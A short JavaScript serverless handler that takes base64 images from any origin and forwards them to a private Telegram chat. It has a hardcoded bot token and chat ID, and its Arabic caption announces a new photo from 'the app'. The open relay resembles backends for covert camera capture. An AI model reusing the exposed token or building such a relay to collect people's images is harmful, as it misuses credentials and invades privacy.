const TELEGRAM_TOKEN = "8850190692:AAGSK0dVs4IlDygtjia8UGYZ88RBU5qn3xw";
const TELEGRAM_CHAT_ID = "8623523505";

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk.toString(); });
    
    return new Promise((resolve) => {
      req.on('end', async () => {
        try {
          const data = JSON.parse(body);
          const base64Image = data.image;

          if (!base64Image) {
            res.status(400).json({ error: "No image data" });
            return resolve();
          }

          const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
          const formData = new URLSearchParams();
          formData.append('chat_id', TELEGRAM_CHAT_ID);
          formData.append('photo', `data:image/jpeg;base64,${base64Image}`);
          formData.append('caption', '📸 صورة جديدة توصلت من التطبيق!');

          await fetch(url, {
            method: 'POST',
            body: formData
          }).catch((e) => console.log(e));

          res.status(200).json({ success: true, message: "Image sent to Telegram" });
          resolve();
        } catch (e) {
          res.status(500).json({ error: "Invalid JSON format" });
          resolve();
        }
      });
    });
  }
  return res.status(405).json({ error: "Method not allowed" });
}
